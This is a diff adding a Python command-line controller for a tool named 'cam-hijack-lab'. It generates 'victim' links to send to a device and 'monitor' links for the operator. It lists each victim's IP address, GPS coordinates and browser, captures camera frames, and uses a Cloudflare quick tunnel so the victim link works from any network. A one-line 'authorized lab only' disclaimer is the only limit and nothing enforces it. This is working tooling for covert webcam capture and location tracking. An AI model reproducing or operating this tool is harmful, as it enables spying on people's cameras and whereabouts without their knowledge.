@@ -1,0 +1,180 @@
+#!/usr/bin/env python3
+"""cam-hijack-lab CLI · authorized lab only (target = perangkat lab milikmu sendiri)
+
+  camlab new                buat session baru -> link victim + link monitor
+  camlab gen victim <sid>   cetak link victim untuk sid
+  camlab gen monitor <sid>  cetak link monitor untuk sid
+  camlab list               sesi aktif (ip, last seen, cam, geo)
+  camlab cap <sid>          simpan frame bukti ke captures/
+  camlab dev <sid>          daftar device yang membuka link
+  camlab sel <sid> <did|auto>  pin feed/flip/capture ke device tertentu
+  camlab kill <sid>         hentikan sesi: device disuruh stop + data dibersihkan
+  camlab tunnel             tunnel cloudflare -> link publik (jaringan apa pun)
+  camlab tunoff             hentikan tunnel
+
+LINGKUNGAN (opsional): CAMLAB_HOST, CAMLAB_PORT, CAMLAB_ORIGIN_PORT
+"""
+import json, os, secrets, ssl, string, subprocess, sys, time
+from urllib.request import Request, urlopen
+
+PORT = os.environ.get("CAMLAB_PORT", "3040")
+CTX = ssl._create_unverified_context()
+
+def base():
+    try:
+        t = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".tunnel-url")).read().strip()
+        if t.startswith("https://"):
+            return t.rstrip("/")
+    except Exception:
+        pass
+    host = os.environ.get("CAMLAB_HOST")
+    if not host:
+        try:
+            host = subprocess.run(["hostname", "-I"], capture_output=True, text=True, timeout=3).stdout.split()[0]
+        except Exception:
+            host = "localhost"
+    return f"https://{host}:{PORT}"
+
+def api(path, method="GET", body=None):
+    req = Request(base() + path, data=body, method=method)
+    with urlopen(req, context=CTX, timeout=5) as r:
+        return r.read()
+
+def j(path, method="GET", body=None):
+    return json.loads(api(path, method, body))
+
+A = string.ascii_lowercase + string.digits
+def new_sid(n=8):
+    return "".join(secrets.choice(A) for _ in range(n))
+
+def cmd_new():
+    sid = new_sid()
+    print(f"session  : {sid}")
+    print(f"victim   : {base()}/v/{sid}   <- kirim ke perangkat lab")
+    print(f"monitor  : {base()}/m/{sid}   <- buka di browser kamu")
+    print(f"monitor* : {base()}/monitor   <- (opsional) auto, ikuti target live apa pun")
+
+def cmd_gen(kind, sid):
+    if kind == "victim":
+        print(f"{base()}/v/{sid}")
+    elif kind == "monitor":
+        print(f"{base()}/m/{sid}")
+    else:
+        sys.exit("kind harus 'victim' atau 'monitor'")
+
+def cmd_list():
+    items = j("/api/sessions")
+    if not items:
+        print("no active sessions")
+        return
+    for s in items:
+        cam = "CAM" if s["cam"] else " ---"
+        last = time.strftime("%H:%M:%S", time.localtime(s["last_seen"]))
+        g = s.get("geo")
+        geo = f'{g["lat"]:.4f},{g["lon"]:.4f} ±{int(g.get("acc") or 0)}m' if g else "no geo"
+        print(f' {s["sid"]:8} {cam:4} last {last} ip={s.get("ip","?")[:20]:20} geo={geo} ua={s.get("ua","")[:30]}')
+
+def cmd_cap(sid):
+    try:
+        r = api(f"/api/capture/{sid}", "POST", b"")
+        d = json.loads(r)
+        print("saved  : captures/" + d["file"])
+    except Exception:
+        print("no frame to capture (session idle / prompt belum granted)")
+
+def cmd_dev(sid):
+    d = j("/api/devices/" + sid)
+    items = d.get("devices", [])
+    sel = d.get("select")
+    if not items:
+        print("no device reported for " + sid); return
+    for x in items:
+        ts = time.strftime("%H:%M:%S", time.localtime(x["seen"])) if x.get("seen") else "-"
+        mark = "   <== PINNED" if x["did"] == sel else ""
+        print(' %s %s  last %s ip=%s ua=%s%s' % (
+            "cam" if x["cam"] else "--", x["did"][:10], ts,
+            (x.get("ip") or "?"), (x.get("ua") or "")[:28], mark))
+    print("mode : " + (sel or "auto (last writer)"))
+
+def cmd_sel(sid, did):
+    target = None if did.lower() in ("auto", "none", "-") else did
+    d = j("/api/select/" + sid, "POST", json.dumps({"did": target}).encode())
+    print("select: " + (d.get("select") or "auto (last writer)"))
+
+def cmd_kill(sid):
+    d = j("/api/kill/" + sid, "POST", json.dumps({}).encode())
+    print("killed " + sid + (" (device disuruh stop kamera)" if d.get("killed") else ""))
+
+def cmd_tunnel():
+    import re, shutil
+    url_exe = shutil.which("cloudflared")
+    if not url_exe:
+        sys.exit("cloudflared belum terpasang. unduh: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/")
+    origin = "http://127.0.0.1:" + (os.environ.get("CAMLAB_ORIGIN_PORT") or str(int(PORT) + 1))
+    try:
+        urlopen(origin + "/api/sessions", timeout=3).read()
+    except Exception:
+        sys.exit("server belum jalan di " + origin + " -> start dulu: ./run.sh")
+    log = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tunnel.log")
+    open(log, "w").close()
+    p = subprocess.Popen([url_exe, "tunnel", "--url", origin, "--no-autoupdate", "--logfile", log],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    url = None
+    for _ in range(30):
+        time.sleep(1)
+        try:
+            m = re.findall(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open(log).read())
+        except Exception:
+            m = []
+        if m:
+            url = m[-1]
+            break
+    if not url:
+        p.kill()
+        sys.exit("gagal mendapat URL tunnel. cek " + log + " (region tidak mendukung quick tunnel? coba ulang / akun cloudflare)")
+    sid = new_sid()
+    print("TUNNEL LIVE (bebas region, via cloudflare edge)")
+    print("  base    : " + url)
+    print("  session : " + sid)
+    print("  victim  : " + url + "/v/" + sid + "   <- kirim ke perangkat, jaringan apa pun (WiFi/data seluler)")
+    print("  monitor : " + url + "/m/" + sid + "   <- buka di browser kamu")
+    print("  monitor*: " + url + "/monitor")
+    print("stop tunnel: ./camlab tunoff   (atau Ctrl-C di terminal ini)")
+    try:
+        p.wait()
+    except KeyboardInterrupt:
+        p.terminate()
+
+def cmd_tunoff():
+    r = subprocess.run(["pkill", "-f", "cloudflared tunnel"], capture_output=True)
+    print("tunnel dihentikan" if r.returncode == 0 else "tidak ada tunnel yang jalan")
+
+def main():
+    sys.stdout.reconfigure(line_buffering=True)
+    a = sys.argv[1:]
+    if not a:
+        print(__doc__.strip()); return
+    c = a[0]
+    if c == "new" and len(a) == 1:
+        cmd_new()
+    elif c == "gen" and len(a) == 3:
+        cmd_gen(a[1], a[2])
+    elif c == "list" and len(a) == 1:
+        cmd_list()
+    elif c == "cap" and len(a) == 2:
+        cmd_cap(a[1])
+    elif c == "dev" and len(a) == 2:
+        cmd_dev(a[1])
+    elif c == "sel" and len(a) == 3:
+        cmd_sel(a[1], a[2])
+    elif c == "kill" and len(a) == 2:
+        cmd_kill(a[1])
+    elif c == "tunnel" and len(a) == 1:
+        cmd_tunnel()
+    elif c == "tunoff" and len(a) == 1:
+        cmd_tunoff()
+    else:
+        sys.exit(__doc__.strip())
+
+if __name__ == "__main__":
+    main()
